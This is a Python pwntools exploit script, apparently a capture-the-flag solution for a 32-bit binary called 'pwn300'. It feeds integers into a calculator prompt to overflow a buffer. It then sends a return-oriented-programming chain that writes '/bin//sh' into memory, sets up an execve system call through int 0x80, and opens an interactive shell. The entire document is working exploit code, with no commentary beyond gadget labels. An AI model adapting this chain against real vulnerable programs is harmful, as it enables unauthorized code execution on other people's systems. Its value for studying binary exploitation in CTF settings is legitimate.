from pwn import *
from struct import pack

context.log_level = 'debug'

def senddata(payload):
	p.recvuntil('the result\n')
	p.sendline('1')
	p.recvuntil('integer x:')
	p.sendline('0')
	p.recvuntil('integer y:')
	p.sendline(str(payload))

p = process('./pwn300')
p.recvuntil('calculate:')
p.sendline('255')

payload = []
payload.append(0x0806ed0a) # pop edx ; ret
payload.append(0x080ea060) # @ .data
payload.append(0x080bb406) # pop eax ; ret
payload.append(int('/bin'[::-1].encode('hex'),16))
payload.append(0x080a1dad) # mov dword ptr [edx], eax ; ret
payload.append(0x0806ed0a) # pop edx ; ret
payload.append(0x080ea064) # @ .data + 4
payload.append(0x080bb406) # pop eax ; ret
payload.append(int('//sh'[::-1].encode('hex'),16))
payload.append(0x080a1dad) # mov dword ptr [edx], eax ; ret
payload.append(0x0806ed0a) # pop edx ; ret
payload.append(0x080ea068) # @ .data + 8
payload.append(0x08054730) # xor eax, eax ; ret
payload.append(0x080a1dad) # mov dword ptr [edx], eax ; ret
payload.append(0x080481c9) # pop ebx ; ret
payload.append(0x080ea060) # @ .data
payload.append(0x0806ed31) # pop ecx ; pop ebx ; ret
payload.append(0x080ea068) # @ .data + 8
payload.append(0x080ea060) # padding without overwrite ebx
payload.append(0x0806ed0a) # pop edx ; ret
payload.append(0x080ea068) # @ .data + 8
payload.append(0x08054730) # xor eax, eax ; ret
payload.append(0x0807b75f) # inc eax ; ret
payload.append(0x0807b75f) # inc eax ; ret
payload.append(0x0807b75f) # inc eax ; ret
payload.append(0x0807b75f) # inc eax ; ret
payload.append(0x0807b75f) # inc eax ; ret
payload.append(0x0807b75f) # inc eax ; ret
payload.append(0x0807b75f) # inc eax ; ret
payload.append(0x0807b75f) # inc eax ; ret
payload.append(0x0807b75f) # inc eax ; ret
payload.append(0x0807b75f) # inc eax ; ret
payload.append(0x0807b75f) # inc eax ; ret
payload.append(0x08049781) # int 0x80


for i in range(16):
	senddata(0)

for i in payload:
	senddata(i)

p.recvuntil(' result\n')
p.sendline('5')
p.interactive()